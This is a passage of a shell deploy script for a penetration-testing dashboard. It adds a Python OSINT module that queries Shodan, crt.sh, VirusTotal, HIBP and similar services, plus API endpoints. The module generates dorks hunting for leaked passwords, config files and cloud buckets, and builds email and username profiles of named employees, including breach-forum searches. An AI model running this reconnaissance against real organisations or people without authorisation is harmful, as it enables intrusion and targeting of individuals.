+    r = _get(url, params={"q": f"%.{domain}", "output": "json"}, timeout=15)
+    if not r or r.status_code != 200:
+        return {"domain": domain, "subdomains": [], "count": 0, "error": "crt.sh unavailable"}
+
+    try:
+        entries = r.json()
+    except (ValueError, KeyError):
+        return {"domain": domain, "subdomains": [], "count": 0, "error": "Invalid JSON from crt.sh"}
+
+    seen = set()
+    subdomains = []
+    for entry in entries:
+        names = entry.get("name_value", "").split("\n")
+        for name in names:
+            name = name.strip().lower().lstrip("*.")
+            if name and name.endswith(domain) and name not in seen:
+                seen.add(name)
+                ips = _resolve(name)
+                subdomains.append({
+                    "subdomain": name,
+                    "ips": ips,
+                    "issuer": entry.get("issuer_name", ""),
+                    "not_before": entry.get("not_before", ""),
+                    "not_after": entry.get("not_after", ""),
+                })
+
+    subdomains.sort(key=lambda x: x["subdomain"])
+    return {"domain": domain, "subdomains": subdomains, "count": len(subdomains)}
+
+
+# ── Shodan InternetDB (free, no key) ─────────────────────────────────────────
+
+def shodan_internetdb(ip: str) -> dict:
+    """Query Shodan InternetDB — free, no API key required."""
+    r = _get(f"https://internetdb.shodan.io/{ip}", timeout=8)
+    if not r:
+        return {"ip": ip, "error": "Shodan InternetDB unreachable"}
+    if r.status_code == 404:
+        return {"ip": ip, "ports": [], "cves": [], "tags": [], "hostnames": [], "vulns": []}
+    if r.status_code != 200:
+        return {"ip": ip, "error": f"HTTP {r.status_code}"}
+    try:
+        data = r.json()
+        return {
+            "ip": ip,
+            "ports": data.get("ports", []),
+            "cves": data.get("vulns", []),
+            "tags": data.get("tags", []),
+            "hostnames": data.get("hostnames", []),
+            "cpes": data.get("cpes", []),
+        }
+    except ValueError:
+        return {"ip": ip, "error": "Invalid JSON from Shodan InternetDB"}
+
+
+def shodan_full(ip: str) -> dict:
+    """Full Shodan host lookup — requires OSINT_SHODAN_KEY."""
+    if not SHODAN_KEY:
+        return {"available": False, "reason": "OSINT_SHODAN_KEY not set"}
+    r = _get(f"https://api.shodan.io/shodan/host/{ip}",
+             params={"key": SHODAN_KEY}, timeout=12)
+    if not r or r.status_code != 200:
+        return {"available": False, "reason": f"HTTP {r.status_code if r else 'unreachable'}"}
+    try:
+        data = r.json()
+        services = []
+        for svc in data.get("data", [])[:20]:
+            services.append({
+                "port": svc.get("port"),
+                "transport": svc.get("transport", "tcp"),
+                "product": svc.get("product", ""),
+                "version": svc.get("version", ""),
+                "banner": (svc.get("data", "") or "")[:200],
+                "cpe": svc.get("cpe", []),
+            })
+        return {
+            "available": True,
+            "ip": ip,
+            "org": data.get("org", ""),
+            "isp": data.get("isp", ""),
+            "asn": data.get("asn", ""),
+            "country": data.get("country_name", ""),
+            "city": data.get("city", ""),
+            "os": data.get("os", ""),
+            "last_update": data.get("last_update", ""),
+            "ports": data.get("ports", []),
+            "hostnames": data.get("hostnames", []),
+            "domains": data.get("domains", []),
+            "vulns": list(data.get("vulns", {}).keys()),
+            "services": services,
+            "tags": data.get("tags", []),
+        }
+    except ValueError:
+        return {"available": False, "reason": "Invalid JSON"}
+
+
+# ── BGPView — ASN / IP / Prefix ──────────────────────────────────────────────
+
+def bgpview_ip(ip: str) -> dict:
+    r = _get(f"https://api.bgpview.io/ip/{ip}", timeout=10)
+    if not r or r.status_code != 200:
+        return {"ip": ip, "error": "BGPView unreachable"}
+    try:
+        data = r.json().get("data", {})
+        prefixes = data.get("prefixes", [])
+        prefix_info = []
+        for p in prefixes[:5]:
+            asn = p.get("asn", {})
+            prefix_info.append({
+                "prefix": p.get("prefix", ""),
+                "asn": asn.get("asn", ""),
+                "org": asn.get("name", ""),
+                "description": asn.get("description", ""),
+                "country": p.get("country_code", ""),
+            })
+        ptr = data.get("ptr_record", "")
+        return {"ip": ip, "ptr": ptr, "prefixes": prefix_info}
+    except (ValueError, KeyError):
+        return {"ip": ip, "error": "Invalid BGPView response"}
+
+
+def bgpview_domain(domain: str) -> dict:
+    ips = _resolve(domain)
+    if not ips:
+        return {"domain": domain, "ips": [], "asn_info": []}
+    results = []
+    for ip in ips[:3]:
+        info = bgpview_ip(ip)
+        info["ip"] = ip
+        results.append(info)
+    return {"domain": domain, "ips": ips, "asn_info": results}
+
+
+# ── GreyNoise — Community threat intel ───────────────────────────────────────
+
+def greynoise_ip(ip: str) -> dict:
+    r = _get(f"https://api.greynoise.io/v3/community/{ip}",
+             headers={"Accept": "application/json"}, timeout=8)
+    if not r:
+        return {"ip": ip, "error": "GreyNoise unreachable"}
+    if r.status_code == 404:
+        return {"ip": ip, "noise": False, "riot": False, "classification": "unknown",
+                "name": "", "link": "", "message": "IP not in GreyNoise dataset"}
+    if r.status_code != 200:
+        return {"ip": ip, "error": f"HTTP {r.status_code}"}
+    try:
+        data = r.json()
+        return {
+            "ip": ip,
+            "noise": data.get("noise", False),
+            "riot": data.get("riot", False),
+            "classification": data.get("classification", "unknown"),
+            "name": data.get("name", ""),
+            "link": data.get("link", ""),
+            "message": data.get("message", ""),
+        }
+    except ValueError:
+        return {"ip": ip, "error": "Invalid GreyNoise response"}
+
+
+# ── AbuseIPDB ─────────────────────────────────────────────────────────────────
+
+def abuseipdb_check(ip: str) -> dict:
+    if not ABUSEIPDB_KEY:
+        return {"available": False, "reason": "OSINT_ABUSEIPDB_KEY not set"}
+    r = _get("https://api.abuseipdb.com/api/v2/check",
+             params={"ipAddress": ip, "maxAgeInDays": 90, "verbose": True},
+             headers={"Key": ABUSEIPDB_KEY, "Accept": "application/json"}, timeout=10)
+    if not r or r.status_code != 200:
+        return {"available": False, "reason": f"HTTP {r.status_code if r else 'unreachable'}"}
+    try:
+        data = r.json().get("data", {})
+        return {
+            "available": True,
+            "ip": ip,
+            "abuse_confidence": data.get("abuseConfidenceScore", 0),
+            "country": data.get("countryCode", ""),
+            "isp": data.get("isp", ""),
+            "domain": data.get("domain", ""),
+            "total_reports": data.get("totalReports", 0),
+            "last_reported": data.get("lastReportedAt", ""),
+            "is_public": data.get("isPublic", True),
+            "is_tor": data.get("isTor", False),
+            "usage_type": data.get("usageType", ""),
+        }
+    except ValueError:
+        return {"available": False, "reason": "Invalid response"}
+
+
+# ── VirusTotal ────────────────────────────────────────────────────────────────
+
+def virustotal_domain(domain: str) -> dict:
+    if not VT_KEY:
+        return {"available": False, "reason": "OSINT_VT_KEY not set"}
+    r = _get(f"https://www.virustotal.com/api/v3/domains/{domain}",
+             headers={"x-apikey": VT_KEY}, timeout=12)
+    if not r or r.status_code != 200:
+        return {"available": False, "reason": f"HTTP {r.status_code if r else 'unreachable'}"}
+    try:
+        attrs = r.json().get("data", {}).get("attributes", {})
+        stats = attrs.get("last_analysis_stats", {})
+        return {
+            "available": True,
+            "domain": domain,
+            "malicious": stats.get("malicious", 0),
+            "suspicious": stats.get("suspicious", 0),
+            "harmless": stats.get("harmless", 0),
+            "undetected": stats.get("undetected", 0),
+            "reputation": attrs.get("reputation", 0),
+            "categories": attrs.get("categories", {}),
+            "creation_date": attrs.get("creation_date", ""),
+            "registrar": attrs.get("registrar", ""),
+            "whois": (attrs.get("whois", "") or "")[:1000],
+        }
+    except ValueError:
+        return {"available": False, "reason": "Invalid response"}
+
+
+def virustotal_ip(ip: str) -> dict:
+    if not VT_KEY:
+        return {"available": False, "reason": "OSINT_VT_KEY not set"}
+    r = _get(f"https://www.virustotal.com/api/v3/ip_addresses/{ip}",
+             headers={"x-apikey": VT_KEY}, timeout=12)
+    if not r or r.status_code != 200:
+        return {"available": False, "reason": f"HTTP {r.status_code if r else 'unreachable'}"}
+    try:
+        attrs = r.json().get("data", {}).get("attributes", {})
+        stats = attrs.get("last_analysis_stats", {})
+        return {
+            "available": True,
+            "ip": ip,
+            "malicious": stats.get("malicious", 0),
+            "suspicious": stats.get("suspicious", 0),
+            "reputation": attrs.get("reputation", 0),
+            "country": attrs.get("country", ""),
+            "asn": attrs.get("asn", ""),
+            "as_owner": attrs.get("as_owner", ""),
+            "network": attrs.get("network", ""),
+        }
+    except ValueError:
+        return {"available": False, "reason": "Invalid response"}
+
+
+# ── URLScan.io ────────────────────────────────────────────────────────────────
+
+def urlscan_search(query: str) -> dict:
+    r = _get("https://urlscan.io/api/v1/search/",
+             params={"q": query, "size": 10}, timeout=10)
+    if not r or r.status_code != 200:
+        return {"query": query, "results": [], "error": f"HTTP {r.status_code if r else 'unreachable'}"}
+    try:
+        data = r.json()
+        results = []
+        for hit in data.get("results", [])[:10]:
+            page = hit.get("page", {})
+            results.append({
+                "url": page.get("url", ""),
+                "ip": page.get("ip", ""),
+                "country": page.get("country", ""),
+                "server": page.get("server", ""),
+                "title": page.get("title", ""),
+                "score": hit.get("_score", 0),
+                "date": hit.get("task", {}).get("time", ""),
+                "screenshot": hit.get("screenshot", ""),
+            })
+        return {"query": query, "total": data.get("total", 0), "results": results}
+    except ValueError:
+        return {"query": query, "results": [], "error": "Invalid response"}
+
+
+# ── Wayback Machine ───────────────────────────────────────────────────────────
+
+def wayback_cdx(domain: str) -> dict:
+    r = _get("http://web.archive.org/cdx/search/cdx",
+             params={"url": f"*.{domain}/*", "output": "json", "limit": 5,
+                     "fl": "timestamp,original,statuscode,mimetype",
+                     "collapse": "urlkey", "from": "2015"}, timeout=12)
+    if not r or r.status_code != 200:
+        return {"domain": domain, "snapshots": [], "count": 0}
+    try:
+        rows = r.json()
+        if not rows or len(rows) < 2:
+            return {"domain": domain, "snapshots": [], "count": 0}
+        headers = rows[0]
+        snapshots = []
+        for row in rows[1:6]:
+            entry = dict(zip(headers, row))
+            snapshots.append({
+                "timestamp": entry.get("timestamp", ""),
+                "url": entry.get("original", ""),
+                "status": entry.get("statuscode", ""),
+                "type": entry.get("mimetype", ""),
+            })
+        return {"domain": domain, "snapshots": snapshots, "count": len(rows) - 1}
+    except (ValueError, IndexError):
+        return {"domain": domain, "snapshots": [], "count": 0}
+
+
+# ── Reverse IP (HackerTarget) ─────────────────────────────────────────────────
+
+def reverse_ip(ip_or_domain: str) -> dict:
+    r = _get("https://api.hackertarget.com/reverseiplookup/",
+             params={"q": ip_or_domain}, timeout=10)
+    if not r or r.status_code != 200:
+        return {"target": ip_or_domain, "hosts": [], "error": "HackerTarget unreachable"}
+    text = r.text.strip()
+    if "error" in text.lower() or "API count" in text:
+        return {"target": ip_or_domain, "hosts": [], "error": text[:100]}
+    hosts = [h.strip() for h in text.splitlines() if h.strip()]
+    return {"target": ip_or_domain, "hosts": hosts, "count": len(hosts)}
+
+
+# ── IPInfo ────────────────────────────────────────────────────────────────────
+
+def ipinfo(ip: str) -> dict:
+    r = _get(f"https://ipinfo.io/{ip}/json", timeout=8)
+    if not r or r.status_code != 200:
+        return {"ip": ip, "error": "IPInfo unreachable"}
+    try:
+        data = r.json()
+        loc = data.get("loc", "").split(",")
+        return {
+            "ip": ip,
+            "hostname": data.get("hostname", ""),
+            "city": data.get("city", ""),
+            "region": data.get("region", ""),
+            "country": data.get("country", ""),
+            "org": data.get("org", ""),
+            "postal": data.get("postal", ""),
+            "timezone": data.get("timezone", ""),
+            "lat": float(loc[0]) if len(loc) == 2 else None,
+            "lon": float(loc[1]) if len(loc) == 2 else None,
+        }
+    except (ValueError, IndexError):
+        return {"ip": ip, "error": "Invalid response"}
+
+
+# ── WHOIS ──────────────────────────────────────────────────────────────────────
+
+def whois_lookup(target: str) -> dict:
+    if not shutil.which("whois"):
+        return {"target": target, "error": "whois not in PATH"}
+    try:
+        result = subprocess.run(
+            ["whois", target], capture_output=True, text=True, timeout=15, check=False
+        )
+        raw = result.stdout[:5000]
+        parsed = {}
+        for line in raw.splitlines():
+            if ":" in line:
+                key, _, val = line.partition(":")
+                key = key.strip().lower().replace(" ", "_")
+                val = val.strip()
+                if key and val and key not in parsed:
+                    parsed[key] = val
+        important = {k: parsed[k] for k in (
+            "registrar", "creation_date", "updated_date", "expiry_date",
+            "name_server", "registrant_name", "registrant_organization",
+            "registrant_country", "registrant_email", "admin_email",
+            "registrant_state/province", "dnssec", "status"
+        ) if k in parsed}
+        return {"target": target, "parsed": important, "raw": raw}
+    except subprocess.TimeoutExpired:
+        return {"target": target, "error": "whois timed out"}
+    except Exception as exc:
+        return {"target": target, "error": str(exc)}
+
+
+# ── DNS Records ───────────────────────────────────────────────────────────────
+
+def dns_records(domain: str) -> dict:
+    """Resolve common DNS record types using system resolver."""
+    record_types = ["A", "AAAA", "MX", "TXT", "NS", "CNAME", "SOA"]
+    records = {}
+
+    try:
+        import dns.resolver as _res
+        resolver = _res.Resolver()
+        resolver.lifetime = 3.0
+        for rtype in record_types:
+            try:
+                answers = resolver.resolve(domain, rtype)
+                records[rtype] = [str(a) for a in answers]
+            except Exception:
+                records[rtype] = []
+    except ImportError:
+        # Fallback to host command
+        for rtype in ["A", "MX", "NS"]:
+            try:
+                out = subprocess.run(
+                    ["host", "-t", rtype, domain],
+                    capture_output=True, text=True, timeout=5, check=False
+                ).stdout
+                lines = [l.strip() for l in out.splitlines() if "has" in l or "mail" in l]
+                records[rtype] = lines
+            except Exception:
+                records[rtype] = []
+
+    return {"domain": domain, "records": records}
+
+
+# ── HIBP — Have I Been Pwned ──────────────────────────────────────────────────
+
+def hibp_email(email: str) -> dict:
+    if not HIBP_KEY:
+        return {"available": False, "reason": "OSINT_HIBP_KEY not set — get free key at haveibeenpwned.com/API"}
+    encoded = quote_plus(email)
+    r = _get(f"https://haveibeenpwned.com/api/v3/breachedaccount/{encoded}",
+             params={"truncateResponse": "false"},
+             headers={"hibp-api-key": HIBP_KEY, "User-Agent": "Omni-Sentinel/21.3"},
+             timeout=10)
+    if not r:
+        return {"available": False, "reason": "HIBP unreachable"}
+    if r.status_code == 404:
+        return {"available": True, "email": email, "breaches": [], "pwned": False}
+    if r.status_code == 401:
+        return {"available": False, "reason": "Invalid HIBP API key"}
+    if r.status_code != 200:
+        return {"available": False, "reason": f"HTTP {r.status_code}"}
+    try:
+        breaches = r.json()
+        simplified = [{
+            "name": b.get("Name", ""),
+            "domain": b.get("Domain", ""),
+            "breach_date": b.get("BreachDate", ""),
+            "data_classes": b.get("DataClasses", []),
+            "pwn_count": b.get("PwnCount", 0),
+            "description": (re.sub(r"<[^>]+>", "", b.get("Description", "") or ""))[:200],
+        } for b in breaches]
+        return {
+            "available": True, "email": email,
+            "pwned": True,
+            "breach_count": len(simplified),
+            "breaches": simplified,
+        }
+    except ValueError:
+        return {"available": False, "reason": "Invalid HIBP response"}
+
+
+def hibp_password(password: str) -> dict:
+    """Check HIBP k-anonymity password API — sends only first 5 chars of SHA-1 hash."""
+    import hashlib
+    sha1 = hashlib.sha1(password.encode("utf-8")).hexdigest().upper()
+    prefix, suffix = sha1[:5], sha1[5:]
+    r = _get(f"https://api.pwnedpasswords.com/range/{prefix}", timeout=8)
+    if not r or r.status_code != 200:
+        return {"available": False, "reason": "HIBP password API unreachable"}
+    for line in r.text.splitlines():
+        h, _, count = line.partition(":")
+        if h.strip() == suffix:
+            return {"available": True, "pwned": True, "count": int(count.strip())}
+    return {"available": True, "pwned": False, "count": 0}
+
+
+# ── Email Pattern Generator ───────────────────────────────────────────────────
+
+def email_patterns(first: str, last: str, domain: str) -> dict:
+    f, l = first.lower(), last.lower()
+    fi, li = f[0] if f else "", l[0] if l else ""
+    patterns = [
+        f"{f}.{l}@{domain}",
+        f"{f}{l}@{domain}",
+        f"{fi}{l}@{domain}",
+        f"{f}{li}@{domain}",
+        f"{f}_{l}@{domain}",
+        f"{l}.{f}@{domain}",
+        f"{l}{fi}@{domain}",
+        f"{f}@{domain}",
+        f"{l}@{domain}",
+        f"{f}.{li}@{domain}",
+        f"{fi}.{l}@{domain}",
+    ]
+    return {
+        "first": first, "last": last, "domain": domain,
+        "patterns": patterns,
+        "most_common": [patterns[0], patterns[2], patterns[6]],
+    }
+
+
+# ── Google Dork Generator ─────────────────────────────────────────────────────
+
+def google_dorks(domain: str, company_name: str = "") -> dict:
+    dorks = {
+        "site_recon": [
+            f'site:{domain}',
+            f'site:{domain} filetype:pdf',
+            f'site:{domain} filetype:doc OR filetype:docx OR filetype:xls',
+            f'site:{domain} intitle:"index of"',
+            f'site:{domain} inurl:admin OR inurl:login OR inurl:portal',
+            f'site:{domain} inurl:api OR inurl:swagger OR inurl:graphql',
+            f'site:{domain} ext:env OR ext:cfg OR ext:conf OR ext:ini',
+            f'site:{domain} "Internal Server Error" OR "SQL syntax"',
+            f'site:{domain} "password" OR "passwd" OR "credentials"',
+        ],
+        "exposed_tech": [
+            f'site:{domain} inurl:wp-admin',
+            f'site:{domain} inurl:phpmyadmin',
+            f'site:{domain} "powered by" OR "built with"',
+        ],
+        "leaks_and_intel": [
+            f'site:pastebin.com "{domain}"',
+            f'site:github.com "{domain}" password OR secret OR api_key',
+            f'site:trello.com "{domain}"',
+            f'site:jira.*.com "{domain}"',
+            f'site:linkedin.com "at {company_name}"' if company_name else None,
+            f'"{domain}" filetype:sql',
+            f'"{domain}" inurl:confluence',
+        ],
+        "linkedin_recon": [
+            f'site:linkedin.com/in "{company_name} "' if company_name else f'site:linkedin.com/in "{domain}"',
+            f'site:linkedin.com/pub "{company_name}"' if company_name else None,
+        ],
+        "cloud_storage": [
+            f'site:s3.amazonaws.com "{domain}"',
+            f'site:blob.core.windows.net "{domain}"',
+            f'site:storage.googleapis.com "{domain}"',
+            f'"\\"{domain}\\"" site:buckets.grayhatwarfare.com',
+        ],
+        "job_postings_tech_leak": [
+            f'site:linkedin.com/jobs OR site:indeed.com "{company_name}" developer' if company_name else None,
+            f'site:glassdoor.com "{company_name}" technology' if company_name else None,
+        ],
+    }
+    # Clean None entries
+    for cat in dorks:
+        dorks[cat] = [d for d in dorks[cat] if d]
+    return {"domain": domain, "company": company_name, "dorks": dorks}
+
+
+# ── Shodan Dork Generator ─────────────────────────────────────────────────────
+
+def shodan_dorks(domain: str, org: str = "") -> dict:
+    dorks = [
+        f'hostname:"{domain}"',
+        f'ssl.cert.subject.cn:"{domain}"',
+        f'ssl.cert.subject.cn:"*.{domain}"',
+    ]
+    if org:
+        dorks += [
+            f'org:"{org}"',
+            f'org:"{org}" port:22',
+            f'org:"{org}" port:3389',
+            f'org:"{org}" port:8080 OR port:8443',
+            f'org:"{org}" http.favicon.hash:*',
+            f'org:"{org}" "default password"',
+        ]
+    return {"domain": domain, "org": org, "dorks": dorks}
+
+
+# ── Person / Employee OSINT ───────────────────────────────────────────────────
+
+def person_osint(first: str, last: str, company: str = "", domain: str = "") -> dict:
+    full_name = f"{first} {last}".strip()
+    results = {
+        "name": full_name,
+        "company": company,
+        "domain": domain,
+        "email_patterns": email_patterns(first, last, domain)["patterns"] if domain else [],
+        "search_dorks": {
+            "general": [
+                f'"{full_name}"',
+                f'"{full_name}" "{company}"' if company else None,
+                f'"{full_name}" email OR contact OR "@"',
+                f'"{full_name}" linkedin OR github OR twitter',
+                f'"{full_name}" site:linkedin.com',
+                f'"{full_name}" site:github.com',
+                f'"{full_name}" site:keybase.io',
+                f'"{first}" "{last}" "{company}" filetype:pdf' if company else None,
+            ],
+            "breach_search": [
+                f'"{full_name}" site:pastebin.com',
+                f'"{full_name}" site:raidforums.com OR site:breachforums.com',
+            ],
+            "social_media": [
+                f'site:twitter.com "{full_name}" OR "{first.lower()}{last.lower()}"',
+                f'site:instagram.com "{first.lower()}.{last.lower()}" OR "{first.lower()}_{last.lower()}"',
+                f'site:facebook.com "{full_name}"',
+            ],
+        },
+        "username_candidates": [
+            f"{first.lower()}{last.lower()}",
+            f"{first.lower()}.{last.lower()}",
+            f"{first.lower()}_{last.lower()}",
+            f"{first[0].lower()}{last.lower()}" if first else "",
+            f"{first.lower()}{last[0].lower()}" if last else "",
+        ],
+    }
+    # Clean None dorks
+    for cat in results["search_dorks"]:
+        results["search_dorks"][cat] = [d for d in results["search_dorks"][cat] if d]
+    return results
+
+
+# ── Full Domain OSINT ─────────────────────────────────────────────────────────
+
+def osint_domain(domain: str, company_name: str = "", deep: bool = False) -> dict:
+    """Full OSINT sweep on a domain — aggregates all free sources."""
+    ips = _resolve(domain)
+    ip = ips[0] if ips else ""
+
+    results = {
+        "target": domain,
+        "resolved_ips": ips,
+        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
+    }
+
+    # Certificate Transparency
+    results["crtsh"] = crtsh_subdomains(domain)
+
+    # WHOIS
+    results["whois"] = whois_lookup(domain)
+
+    # DNS Records
+    results["dns"] = dns_records(domain)
+
+    # BGP / ASN
+    results["bgp"] = bgpview_domain(domain)
+
+    # Wayback Machine
+    results["wayback"] = wayback_cdx(domain)
+
+    # URLScan
+    results["urlscan"] = urlscan_search(f"domain:{domain}")
+
+    # Reverse IP
+    if ip:
+        results["reverse_ip"] = reverse_ip(ip)
+
+    # Per-IP intelligence
+    if ip:
+        results["shodan_internetdb"] = shodan_internetdb(ip)
+        results["greynoise"] = greynoise_ip(ip)
+        results["ipinfo"] = ipinfo(ip)
+        if ABUSEIPDB_KEY:
+            results["abuseipdb"] = abuseipdb_check(ip)
+        if SHODAN_KEY:
+            results["shodan_full"] = shodan_full(ip)
+        if VT_KEY:
+            results["virustotal"] = virustotal_domain(domain)
+
+    # Dorks
+    results["google_dorks"] = google_dorks(domain, company_name)
+    results["shodan_dorks"] = shodan_dorks(domain)
+
+    return results
+
+
+# ── Full IP OSINT ─────────────────────────────────────────────────────────────
+
+def osint_ip(ip: str) -> dict:
+    results = {
+        "target": ip,
+        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
+    }
+    results["shodan_internetdb"] = shodan_internetdb(ip)
+    results["bgp"] = bgpview_ip(ip)
+    results["greynoise"] = greynoise_ip(ip)
+    results["ipinfo"] = ipinfo(ip)
+    results["reverse_ip"] = reverse_ip(ip)
+    results["reverse_dns"] = _resolve_ptr(ip)
+    if ABUSEIPDB_KEY:
+        results["abuseipdb"] = abuseipdb_check(ip)
+    if SHODAN_KEY:
+        results["shodan_full"] = shodan_full(ip)
+    if VT_KEY:
+        results["virustotal"] = virustotal_ip(ip)
+    results["google_dorks"] = [
+        f'"{ip}"',
+        f'ip:{ip} site:shodan.io',
+        f'"{ip}" site:pastebin.com',
+        f'"{ip}" site:github.com',
+    ]
+    return results
+
+
+def _resolve_ptr(ip: str) -> str:
+    try:
+        return socket.gethostbyaddr(ip)[0]
+    except (socket.herror, socket.gaierror):
+        return ""
+
+
+# ── Email OSINT ───────────────────────────────────────────────────────────────
+
+def osint_email(email: str) -> dict:
+    results = {
+        "target": email,
+        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
+    }
+    if HIBP_KEY:
+        results["hibp"] = hibp_email(email)
+    else:
+        results["hibp"] = {"available": False, "reason": "OSINT_HIBP_KEY not set"}
+
+    domain = email.split("@")[-1] if "@" in email else ""
+    if domain:
+        results["domain_intel"] = {
+            "mx_records": dns_records(domain).get("records", {}).get("MX", []),
+            "ipinfo": ipinfo(_resolve(domain)[0]) if _resolve(domain) else {},
+        }
+    results["search_dorks"] = [
+        f'"{email}"',
+        f'"{email}" site:pastebin.com',
+        f'"{email}" site:github.com',
+        f'"{email}" password OR hash',
+        f'"{email}" site:linkedin.com',
+    ]
+    return results
+
+
+# ── Scan-Attached OSINT ───────────────────────────────────────────────────────
+
+def osint_from_scan(scan_row: dict, company_name: str = "") -> dict:
+    """Run the appropriate OSINT based on whether the scan target is an IP or domain."""
+    target = scan_row.get("target", "")
+    if _is_ip(target):
+        return {"type": "ip", "result": osint_ip(target)}
+    else:
+        return {"type": "domain", "result": osint_domain(target, company_name=company_name)}
+PY
+
+# ── OSINT API routes ──────────────────────────────────────────────────────────
+cat >> "$BASE/dashboard/app.py" <<'PYOSINT'
+
+
+# ── OSINT Endpoints ───────────────────────────────────────────────────────────
+
+class OsintDomainRequest(BaseModel):
+    domain: str = Field(..., min_length=1, max_length=255)
+    company_name: str = Field(default="", max_length=200)
+    deep: bool = Field(default=False)
+
+
+class OsintIpRequest(BaseModel):
+    ip: str = Field(..., min_length=7, max_length=45)
+
+
+class OsintEmailRequest(BaseModel):
+    email: str = Field(..., min_length=5, max_length=320)
+
+
+class OsintPersonRequest(BaseModel):
+    first_name: str = Field(..., min_length=1, max_length=100)
+    last_name: str = Field(..., min_length=1, max_length=100)
+    company: str = Field(default="", max_length=200)
+    domain: str = Field(default="", max_length=255)
+
+
+class OsintScanRequest(BaseModel):
+    company_name: str = Field(default="", max_length=200)
+
+
+@app.post("/osint/domain")
+def osint_domain_endpoint(request: OsintDomainRequest, user: dict = Depends(verify_token)) -> dict:
+    from plugins.osint import osint_domain
+    try:
+        return osint_domain(request.domain, company_name=request.company_name, deep=request.deep)
+    except Exception as exc:
+        raise HTTPException(status_code=500, detail=str(exc))
+
+
+@app.post("/osint/ip")
+def osint_ip_endpoint(request: OsintIpRequest, user: dict = Depends(verify_token)) -> dict:
+    from plugins.osint import osint_ip
+    try:
+        return osint_ip(request.ip)
+    except Exception as exc:
+        raise HTTPException(status_code=500, detail=str(exc))
+
+
+@app.post("/osint/email")
+def osint_email_endpoint(request: OsintEmailRequest, user: dict = Depends(verify_token)) -> dict:
+    from plugins.osint import osint_email
+    try:
+        return osint_email(request.email)
+    except Exception as exc:
+        raise HTTPException(status_code=500, detail=str(exc))
+
+
+@app.post("/osint/person")
+def osint_person_endpoint(request: OsintPersonRequest, user: dict = Depends(verify_token)) -> dict:
+    from plugins.osint import person_osint, email_patterns
+    try:
+        result = person_osint(request.first_name, request.last_name,
+                              company=request.company, domain=request.domain)
+        if request.domain:
+            result["email_patterns"] = email_patterns(
+                request.first_name, request.last_name, request.domain
+            )
+        return result
+    except Exception as exc:
+        raise HTTPException(status_code=500, detail=str(exc))
+
+
+@app.post("/osint/dorks")
+def osint_dorks_endpoint(domain: str = Query(...), company: str = Query(""),
+                         user: dict = Depends(verify_token)) -> dict:
+    from plugins.osint import google_dorks, shodan_dorks
+    return {
+        "domain": domain,
+        "google": google_dorks(domain, company),
+        "shodan": shodan_dorks(domain, org=company),
+    }
+
+
+@app.post("/scans/{scan_id}/osint")
+def scan_osint(scan_id: str, request: OsintScanRequest, user: dict = Depends(verify_token)) -> dict:
+    with closing(get_db()) as db:
+        row = db.execute("SELECT * FROM scans WHERE id=?", (scan_id,)).fetchone()
+        if not row:
+            raise HTTPException(status_code=404, detail="Scan not found")
+    try:
+        from plugins.osint import osint_from_scan
+        result = osint_from_scan(dict(row), company_name=request.company_name)
+        log_event(scan_id, "osint_complete",
+                  f"Type: {result['type']} | target: {row['target']}",
+                  actor=user["username"])
+        return result
+    except Exception as exc:
+        log_event(scan_id, "osint_error", str(exc), actor=user["username"])
+        raise HTTPException(status_code=500, detail=str(exc))
+
+
+@app.post("/osint/hibp/password")
+def hibp_password_check(body: dict, user: dict = Depends(verify_token)) -> dict:
+    password = body.get("password", "")
+    if not password:
+        raise HTTPException(status_code=400, detail="password required")
+    from plugins.osint import hibp_password
+    return hibp_password(password)
+PYOSINT
+
+# ── Update .env with OSINT API key placeholders ───────────────────────────────
+cat >> "$BASE/.env" <<'ENVOSINT'
+OSINT_SHODAN_KEY=
+OSINT_VT_KEY=
+OSINT_ABUSEIPDB_KEY=
+OSINT_HIBP_KEY=
+ENVOSINT
+
+log "OK" "All new features deployed:"
+log "OK" "  ── RECON & ENUMERATION ──"
+log "OK" "  ✓ plugins/smb_enum.py          — enum4linux-ng + smbclient null session"
+log "OK" "  ✓ plugins/snmp_walker.py       — SNMP walk + community brute force"
+log "OK" "  ✓ plugins/ldap_enum.py         — LDAP/AD enum (users, kerberoastable, ASREP)"
+log "OK" "  ✓ plugins/banner_grabber.py    — Banner grabbing on all open ports"
+log "OK" "  ── REPORTING & WORKFLOW ──"
+log "OK" "  ✓ plugins/obsidian_exporter.py — Obsidian-compatible markdown vault export"
+log "OK" "  ✓ plugins/screenshot_labeler.py — Screenshots with timestamp + port context labels"
+log "OK" "  ── INTELLIGENCE ──"
+log "OK" "  ✓ plugins/weak_password_detector.py — Weak password pattern analysis"
+log "OK" "  ✓ plugins/cve_heatmap.py       — CVE severity heatmap per target over time"
+log "OK" "  ── UI COMPONENTS ──"
+log "OK" "  ✓ src/AttackGraph.jsx          — SVG attack path graph (nodes=services, edges=chains)"
+log "OK" "  ✓ src/LiveTerminal.jsx         — Live terminal output streaming via SSE"
+log "OK" "  ✓ src/SideBySideDiff.jsx       — Side-by-side diff view with filter"
+log "OK" "  ── NEW API ENDPOINTS ──"
+log "OK" "  ✓ POST /scans/{id}/smb         — SMB enumeration"
+log "OK" "  ✓ POST /scans/{id}/snmp        — SNMP walk"
+log "OK" "  ✓ POST /scans/{id}/ldap        — LDAP/AD enumeration"
+log "OK" "  ✓ POST /scans/{id}/banners     — Banner grabbing"
+log "OK" "  ✓ POST /scans/{id}/obsidian    — Obsidian vault export (Engagements/ folder)"
+log "OK" "  ✓ GET  /scans/{id}/stream      — SSE live terminal stream"
+log "OK" "  ✓ GET  /scans/{id}/screenshot-labels — Labeled screenshot index"
+log "OK" "  ✓ GET  /heatmap                — CVE heatmap over time"
+log "OK" "  ✓ POST /passwords/analyze      — Weak password detection"
+log "OK" "  ✓ GET  /credentials/weak-analysis — Full credential weakness report"
+log "OK" "  ── WEB VULNERABILITY SCANNER ──"
+log "OK" "  ✓ plugins/web_vuln.py          — Unified web vuln scanner:"
+log "OK" "      • Security headers audit (HSTS, CSP, X-Frame-Options, etc.)"
+log "OK" "      • Sensitive file exposure (/.env, /.git/, /wp-config.php, 30+ paths)"
+log "OK" "      • Open redirect (15 redirect params, 8 payloads)"
+log "OK" "      • CORS misconfiguration (wildcard + credentialed origins)"
+log "OK" "      • Command injection (time-based, 5 payload variants)"
+log "OK" "      • Directory traversal (Linux + Windows paths, encoded variants)"
+log "OK" "      • IDOR probing (numeric param enumeration)"
